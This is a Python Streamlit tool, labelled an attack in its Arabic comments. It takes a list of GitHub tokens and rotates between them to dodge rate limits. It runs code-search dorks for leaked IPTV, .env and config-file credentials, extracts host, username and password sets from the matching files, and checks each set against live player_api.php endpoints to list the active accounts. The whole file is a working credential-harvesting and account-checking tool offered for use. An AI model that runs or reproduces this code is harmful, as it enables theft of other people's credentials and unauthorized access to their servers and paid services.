import streamlit as st
import requests
import re
import time
from datetime import datetime
import random

# إعدادات الواجهة
st.set_page_config(page_title="BEAST V41 - ULTIMATE MASSIVE", layout="wide")

# نظام الدخول
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🌪️ BEAST V41 - ULTIMATE MASSIVE</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق الألوان (هوية الهاكر)
st.markdown("""
<style>
    .stApp { background-color: #000; }
    .scan-log { color: #00d4ff; font-family: monospace; font-size: 13px; margin: 0; padding: 2px; }
    .active-hit { 
        background: #0d1117; border: 2px solid #00ff41; 
        padding: 15px; border-radius: 8px; margin-bottom: 10px;
        box-shadow: 0 0 10px rgba(0,255,65,0.2);
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-yellow { color: #fbbf24; font-weight: bold; }
    .text-white { color: #fff; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# الجانب الجانبي للتحكم
with st.sidebar:
    st.title("⚡ BEAST V41")
    tokens_raw = st.text_area("أدخل التوكنات (كل توكن في سطر):", height=150, placeholder="ghp_xxx...\nghp_yyy...")
    tokens_list = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    st.divider()
    pages_limit = st.slider("عمق الصفحات لكل دروك:", 1, 100, 50)
    start = st.button("🚀 إطلاق الهجوم الشامل")
    
    if tokens_list:
        st.success(f"تم تحميل {len(tokens_list)} توكنات")

# مناطق العرض الحية
st.subheader("📡 الرادار المباشر (فحص مستمر)")
radar_area = st.empty() 

st.subheader("🏆 النتائج الشغالة المستخرجة (Hits)")
hits_area = st.container()

# المحرك الرئيسي
if start and tokens_list:
    found_count = 0
    token_index = 0
    
    # قائمة ضخمة من الدروكات الاحترافية
    mega_dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" username password',
        'extension:env "XTREAM_USER" "XTREAM_PASSWORD"',
        'extension:json "server_url" "username"',
        'extension:log "http://" "username=" "password="',
        'filename:config.php "db_user" "db_pass" "http"',
        '"beIN" "get.php?username="',
        '"SSC" "player_api.php"',
        '"OSN" "password=" "http"',
        'path:etc/php "username=" "password="',
        'extension:m3u8 "username=" "password="',
        'filename:.env "PORT" "USER" "PASSWORD" "HOST"',
        'extension:txt "http://" "port" "username"',
        'filename:settings.json "xtream" "password"',
        'extension:cfg "xtream" "user"',
        'filename:info.txt "username=" "password=" "http"'
    ]
    
    for dork in mega_dorks:
        for page in range(1, pages_limit + 1):
            # تبديل التوكن تلقائياً
            current_token = tokens_list[token_index % len(tokens_list)]
            headers = {
                'Authorization': f'token {current_token}',
                'Accept': 'application/vnd.github.v3+json',
                'User-Agent': 'Mozilla/5.0'
            }
            
            try:
                # تأخير بسيط جداً لتفادي الحظر السريع
                time.sleep(0.5)
                
                search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100&sort=indexed"
                res = requests.get(search_url, headers=headers).json()
                
                # إذا تعطل التوكن انتقل للتالي
                if "items" not in res:
                    radar_area.warning(f"⚠️ التوكن {token_index + 1} محظور حالياً.. تبديل...")
                    token_index += 1
                    time.sleep(2)
                    continue

                for item in res['items']:
                    raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                    try:
                        content = requests.get(raw_url, timeout=3).text
                        # ريجيكس مطور لسحب الروابط حتى بدون بورت
                        matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                        
                        for m in matches:
                            host, user, pw = m[0], m[1], m[2]
                            radar_area.markdown(f"<p class='scan-log'>🔍 Checking: {host}</p>", unsafe_allow_html=True)
                            
                            try:
                                # فحص السيرفر
                                check_url = f"{host}/player_api.php?username={user}&password={pw}"
                                r = requests.get(check_url, timeout=2).json()
                                
                                if r.get("user_info", {}).get("status") == "Active":
                                    found_count += 1
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="active-hit">
                                            <span class="text-green">✅ HIT #{found_count}</span><br>
                                            <span class="text-white">HOST: {host}</span><br>
                                            <span class="text-yellow">USER: {user} | PASS: {pw}</span><br>
                                            <small style="color:#888;">Expiry: {r['user_info'].get('exp_date')} | Max Conn: {r['user_info'].get('max_connections')}</small>
                                        </div>
                                        """, unsafe_allow_html=True)
                            except: continue
                    except: continue
            except:
                token_index += 1
                continue

    st.sidebar.success("🎉 اكتمل المسح الشامل!")
